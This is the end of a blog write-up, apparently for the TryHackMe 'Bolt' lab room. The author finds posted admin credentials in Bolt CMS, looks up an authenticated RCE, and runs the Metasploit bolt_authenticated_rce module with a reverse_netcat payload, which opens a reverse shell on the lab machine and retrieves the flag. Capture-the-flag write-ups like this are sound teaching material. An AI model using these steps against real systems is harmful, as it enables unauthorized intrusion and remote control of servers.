+SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Bolt<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\|\x</span>20A<span style="color:#ae81ff">\x</span>20hero<span style="color:#ae81ff">\x</span>20is<span style="color:#ae81ff">\x</span>20unleashed&lt;/title&gt;<span style="color:#ae81ff">\n\x</span><span style="color:#ae81ff">2</span>
+SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>https://fonts<span style="color:#ae81ff">\.</span>googleapis<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:.com/css<span style="color:#ae81ff">\?</span>family<span style="color:#f92672">=</span>Bitter<span style="color:#ae81ff">\|</span>Roboto:400,400i,700<span style="color:#ae81ff">\&#34;\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>
+SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/
+SF:theme/base-2018/css/bulma<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\?</span>8ca0842ebb<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/theme/base-2018/css/them
+SF:e<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\?</span>6cb66bfe9f<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>generator<span style="color:#ae81ff">\&#34;\x</span><span style="color:#ae81ff">2</span>
+SF:0content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Bolt<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;/head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;body&gt;<span style="color:#ae81ff">\n\x</span>
+SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;a<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#75715e">#main-content\&#34;\x20class=\&#34;v</span>
+SF:is<span style="color:#e6db74">&#34;);
+</span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds
+</span></code></pre></div><h2 id="task-2-what-is-the-username-we-can-find-in-the-cms">[Task 2] What is the username we can find in the CMS?</h2>
+<p>Without much digging I&rsquo;m gonna guess it is <strong>bolt</strong> based on the overall theme of the room and indeed it is accepted as valid. This is weird because the post we can see in the page mentions the user is <strong>jake</strong> and he also posts his password <strong>REDACTED</strong> could this be a bug on the room? (Spoiler: It is not. XD )</p>
+<h2 id="task-3-what-is-the-password-we-can-find-for-the-username">[Task 3] What is the password we can find for the username?</h2>
+<p><img src="https://i.imgur.com/Swa5OGj.png" alt="Post from Admin with a Password"></p>
+<p>We already got a password in the previous task.</p>
+<h2 id="task-4-what-version-of-the-cms-is-installed-on-the-server-ex-name-111">[Task 4] What version of the CMS is installed on the server? (Ex: Name 1.1.1)</h2>
+<p>Since we have a username and password, we could try to google a bit common login page URL locations for Bolt CMS.
+When we try to access, we do get a login form.</p>
+<p><img src="https://i.imgur.com/3Q8d31i.png" alt="Bolt Login form"></p>
+<p>Once we are logged in we can see the installed version in the footer toolbar and with that we get the answer to the CMS version:</p>
+<p><img src="https://i.imgur.com/3Wv2bhG.png" alt="Bolt version installed"></p>
+<p>Let&rsquo;s move to the next question.</p>
+<h2 id="task-5-theres-an-exploit-for-a-previous-version-of-this-cms-which-allows-authenticated-rce-find-it-on-exploit-db-whats-its-edb-id">[Task 5] There&rsquo;s an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What&rsquo;s its EDB-ID?</h2>
+<p>Using <strong>Exploit-DB</strong> we can look for RCE vulnerabilities for <strong>older</strong> versions of Bolt CMS.</p>
+<p><img src="https://i.imgur.com/DXLDHC9.png" alt="Exploit-DB"></p>
+<p>Let&rsquo;s move on.</p>
+<h2 id="task-6-metasploit-recently-added-an-exploit-module-for-this-vulnerability-whats-the-full-path-for-this-exploit-ex-exploit">[Task 6] Metasploit recently added an exploit module for this vulnerability. What&rsquo;s the full path for this exploit? (Ex: exploit/&hellip;.)</h2>
+<p>We fire up <strong>msfconsole</strong> and do a <strong>search bolt cms</strong> to see the available exploits:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf5 &gt; search bolt cms
+
+Matching Modules
+<span style="color:#f92672">================</span>
+
+   <span style="color:#75715e">#   Name                                              Disclosure Date  Rank       Check  Description</span>
+   -   ----                                              ---------------  ----       -----  -----------
+   <span style="color:#ae81ff">0</span>   auxiliary/admin/sunrpc/solaris_kcms_readfile      2003-01-22       normal     No     Solaris KCMS + TTDB Arbitrary File Read
+   <span style="color:#ae81ff">1</span>   auxiliary/gather/ipcamera_password_disclosure     2016-08-16       normal     No     JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure
+   <span style="color:#ae81ff">2</span>   auxiliary/gather/nuuo_cms_bruteforce              2018-10-11       normal     No     Nuuo Central Management Server User Session Token Bruteforce
+   <span style="color:#ae81ff">3</span>   auxiliary/gather/nuuo_cms_file_download           2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
+   <span style="color:#ae81ff">4</span>   auxiliary/scanner/http/ektron_cms400net                            normal     No     Ektron CMS400.NET Default Password Scanner
+   <span style="color:#ae81ff">5</span>   auxiliary/scanner/http/s40_traversal              2011-04-07       normal     No     S40 0.4.2 CMS Directory Traversal Vulnerability
+   <span style="color:#ae81ff">6</span>   auxiliary/scanner/http/squiz_matrix_user_enum     2011-11-08       normal     No     Squiz Matrix User Enumeration Scanner
+   <span style="color:#ae81ff">7</span>   auxiliary/scanner/http/vcms_login                                  normal     No     V-CMS Login Utility
+   <span style="color:#ae81ff">8</span>   auxiliary/scanner/misc/cctv_dvr_login                              normal     No     CCTV DVR Login Scanning Utility
+   <span style="color:#ae81ff">9</span>   exploit/aix/rpc_cmsd_opcode21                     2009-10-07       great      No     AIX Calendar Manager Service Daemon <span style="color:#f92672">(</span>rpc.cmsd<span style="color:#f92672">)</span> Opcode <span style="color:#ae81ff">21</span> Buffer Overflow
+   <span style="color:#ae81ff">10</span>  exploit/linux/http/cayin_cms_ntp                  2020-06-04       excellent  Yes    Cayin CMS NTP Server RCE
+   <span style="color:#ae81ff">11</span>  exploit/linux/http/tiki_calendar_exec             2016-06-06       excellent  Yes    Tiki-Wiki CMS Calendar Command Execution
+   <span style="color:#ae81ff">12</span>  exploit/linux/http/vcms_upload                    2011-11-27       excellent  Yes    V-CMS PHP File Upload and Execute
+   <span style="color:#ae81ff">13</span>  exploit/multi/http/bolt_file_upload               2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
+   <span style="color:#ae81ff">14</span>  exploit/multi/http/cmsms_object_injection_rce     2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
+   <span style="color:#ae81ff">15</span>  exploit/multi/http/cmsms_showtime2_rce            2019-03-11       normal     Yes    CMS Made Simple <span style="color:#f92672">(</span>CMSMS<span style="color:#f92672">)</span> Showtime2 File Upload RCE
+   <span style="color:#ae81ff">16</span>  exploit/multi/http/cmsms_upload_rename_rce        2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
+   <span style="color:#ae81ff">17</span>  exploit/multi/http/familycms_less_exec            2011-11-29       excellent  Yes    Family Connections less.php Remote Command Execution
+   <span style="color:#ae81ff">18</span>  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
+   <span style="color:#ae81ff">19</span>  exploit/multi/http/lcms_php_exec                  2011-03-03       excellent  Yes    LotusCMS 3.0 eval<span style="color:#f92672">()</span> Remote Command Execution
+   <span style="color:#ae81ff">20</span>  exploit/multi/http/log1cms_ajax_create_folder     2011-04-11       excellent  Yes    Log1 CMS writeInfo<span style="color:#f92672">()</span> PHP Code Injection
+   <span style="color:#ae81ff">21</span>  exploit/multi/http/monstra_fileupload_exec        2017-12-18       excellent  Yes    Monstra CMS Authenticated Arbitrary File Upload
+   <span style="color:#ae81ff">22</span>  exploit/multi/http/navigate_cms_rce               2018-09-26       excellent  Yes    Navigate CMS Unauthenticated Remote Code Execution
+   <span style="color:#ae81ff">23</span>  exploit/multi/http/october_upload_bypass_exec     2017-04-25       excellent  Yes    October CMS Upload Protection Bypass Code Execution
+   <span style="color:#ae81ff">24</span>  exploit/multi/http/polarcms_upload_exec           2012-01-21       excellent  Yes    PolarBear CMS PHP File Upload Vulnerability
+   <span style="color:#ae81ff">25</span>  exploit/multi/http/sflog_upload_exec              2012-07-06       excellent  Yes    Sflog! CMS 1.0 Arbitrary File Upload Vulnerability
+   <span style="color:#ae81ff">26</span>  exploit/multi/http/totaljs_cms_widget_exec        2019-08-30       excellent  Yes    Total.js CMS <span style="color:#ae81ff">12</span> Widget JavaScript Code Injection
+   <span style="color:#ae81ff">27</span>  exploit/multi/php/php_unserialize_zval_cookie     2007-03-04       average    Yes    PHP <span style="color:#ae81ff">4</span> unserialize<span style="color:#f92672">()</span> ZVAL Reference Counter Overflow <span style="color:#f92672">(</span>Cookie<span style="color:#f92672">)</span>
+   <span style="color:#ae81ff">28</span>  exploit/unix/webapp/bolt_authenticated_rce        2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
+   <span style="color:#ae81ff">29</span>  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
+   <span style="color:#ae81ff">30</span>  exploit/unix/webapp/havalite_upload_exec          2013-06-17       excellent  Yes    Havalite CMS Arbitary File Upload Vulnerability
+   <span style="color:#ae81ff">31</span>  exploit/unix/webapp/instantcms_exec               2013-06-26       excellent  Yes    InstantCMS 1.6 Remote PHP Code Execution
+   <span style="color:#ae81ff">32</span>  exploit/unix/webapp/joomla_akeeba_unserialize     2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
+   <span style="color:#ae81ff">33</span>  exploit/unix/webapp/joomla_media_upload_exec      2013-08-01       excellent  Yes    Joomla Media Manager File Upload Vulnerability
+   <span style="color:#ae81ff">34</span>  exploit/unix/webapp/libretto_upload_exec          2013-06-14       excellent  Yes    LibrettoCMS File Manager Arbitary File Upload Vulnerability
+   <span style="color:#ae81ff">35</span>  exploit/unix/webapp/skybluecanvas_exec            2014-01-28       excellent  Yes    SkyBlueCanvas CMS Remote Code Execution
+   <span style="color:#ae81ff">36</span>  exploit/windows/browser/ie_execcommand_uaf        2012-09-14       good       No     MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability
+   <span style="color:#ae81ff">37</span>  exploit/windows/http/ektron_xslt_exec             2012-10-16       excellent  Yes    Ektron 8.02 XSLT Transform Remote Code Execution
+   <span style="color:#ae81ff">38</span>  exploit/windows/http/ektron_xslt_exec_ws          2015-02-05       excellent  Yes    Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution
+   <span style="color:#ae81ff">39</span>  exploit/windows/http/kentico_staging_syncserver   2019-04-15       excellent  Yes    Kentico CMS Staging SyncServer Unserialize Remote Command Execution
+   <span style="color:#ae81ff">40</span>  exploit/windows/http/umbraco_upload_aspx          2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
+   <span style="color:#ae81ff">41</span>  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass <span style="color:#f92672">(</span>Via COM Handler Hijack<span style="color:#f92672">)</span>
+   <span style="color:#ae81ff">42</span>  exploit/windows/nuuo/nuuo_cms_fu                  2018-10-11       manual     No     Nuuo Central Management Server Authenticated Arbitrary File Upload
+   <span style="color:#ae81ff">43</span>  exploit/windows/nuuo/nuuo_cms_sqli                2018-10-11       normal     No     Nuuo Central Management Authenticated SQL Server SQLi
+   <span style="color:#ae81ff">44</span>  exploit/windows/smtp/njstar_smtp_bof              2011-10-31       normal     Yes    NJStar Communicator 3.00 MiniSMTP Buffer Overflow
+
+
+Interact with a module by name or index, <span style="color:#66d9ef">for</span> example use <span style="color:#ae81ff">44</span> or use exploit/windows/smtp/njstar_smtp_bof
+
+msf5 &gt; 
+</code></pre></div><p>by looking at the results returned and having found the vulnerability on <strong>Exploit-DB</strong> we get the answer to the room question.
+Let&rsquo;s try to exploit that in the next step.</p>
+<h2 id="task-7-set-the-lhost-lport-rhost-username-password-in-msfconsole-before-running-the-exploit">[Task 7] Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit</h2>
+<p>Let&rsquo;s configure the options for our exploit, by doing <strong>show options</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload cmd/unix/reverse_netcat
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; show options
+
+Module options <span style="color:#f92672">(</span>exploit/unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span>:
+
+   Name                 Current Setting        Required  Description
+   ----                 ---------------        --------  -----------
+   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from <span style="color:#e6db74">&#34;/files&#34;</span> on the web server to <span style="color:#e6db74">&#34;/root&#34;</span> on the server
+   PASSWORD                                    yes       Password to authenticate with
+   Proxies                                     no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+   RHOSTS                                      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+   RPORT                8***                   yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT              <span style="color:#ae81ff">8080</span>                   yes       The local port to listen on.
+   SSL                  false                  no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
+   SSLCert                                     no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
+   TARGETURI            /                      yes       Base path to Bolt CMS
+   URIPATH                                     no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
+   USERNAME                                    yes       Username to authenticate with
+   VHOST                                       no        HTTP server virtual host
+
+
+Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_netcat<span style="color:#f92672">)</span>:
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span style="color:#ae81ff">2</span>   Linux <span style="color:#f92672">(</span>cmd<span style="color:#f92672">)</span>
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set LHOST tun0
+LHOST <span style="color:#f92672">=</span>&gt; 10.13.0.34
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.105.96
+RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.105.96
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set USERNAME bolt
+USERNAME <span style="color:#f92672">=</span>&gt; bolt
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set PASSWORD REDACTED
+PASSWORD <span style="color:#f92672">=</span>&gt; boltadmin123
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; 
+
+</code></pre></div><p>Let&rsquo;s run the exploit so we can answer the last question:</p>
+<h2 id="task-8-look-for-flagtxt-inside-the-machine">[Task 8] Look for flag.txt inside the machine.</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; run
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.13.0.34:4444 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing automatic check <span style="color:#f92672">(</span>disable AutoCheck to override<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable <span style="color:#e6db74">&#34;hxzhm&#34;</span>.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">4</span> potential token<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span> creating .php files.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file evhhumxnxs.php.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file jfdcqabl.php.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file hgpputegi.php.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Used token dc684ac30691d198a52d1110d6 to create helqvqylpa.php.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to execute the payload via <span style="color:#e6db74">&#34;/files/helqvqylpa.php?hxzhm=`payload`&#34;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">7</span> opened <span style="color:#f92672">(</span>10.13.0.34:4444 -&gt; 10.10.105.96:44727<span style="color:#f92672">)</span> at 2020-08-26 21:26:37 -0400
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No response, may have executed a blocking payload!
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file helqvqylpa.php.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Reverted user profile back to original state.
+
+ls
+index.html
+shell  
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to find binary<span style="color:#f92672">(</span>python<span style="color:#f92672">)</span> on target machine
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found python at 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using <span style="color:#e6db74">`</span>python<span style="color:#e6db74">`</span> to pop up an interactive shell
+pwd
+/home/bolt/public/files
+cat /home/bolt/flag.txt
+cat /home/flag.txt
+THM<span style="color:#f92672">{</span>FLAG_REDACTED_YOU_GOT_THIS!<span style="color:#f92672">}</span>
+
+</code></pre></div><p>The shell we got is quite basic and in my case we it hanged a lot of times. I was unable to upgrade that shell to meterpreter, but to be honest I tried it just once and moved on. I tried a bit of exploring probing some paths with <strong>cat</strong> looking for <strong>flag.txt</strong> and found it rather quickly.</p>
+<p>That&rsquo;s it for Bolt room. Hope you enjoyed it!</p>
+<p>As usual, happy hacking.</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<div class="container" style="margin:10px !important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+</div>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
+            <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
+            <line x1="7" y1="7" x2="7" y2="7"></line>
+          </svg><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/hacking/">hacking</a></span><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/tryhackme/">tryHackme</a></span><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/writeups/">writeups</a></span>
+        </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1838 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        2020-08-26 21:34 -0400
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Bolt_writeup.sh&amp;caption=Bolt_writeup.sh&amp;canonicalUrl=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=Bolt_writeup.sh&amp;body=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f&amp;media=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fbolt_writeup%2f;description=Bolt_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
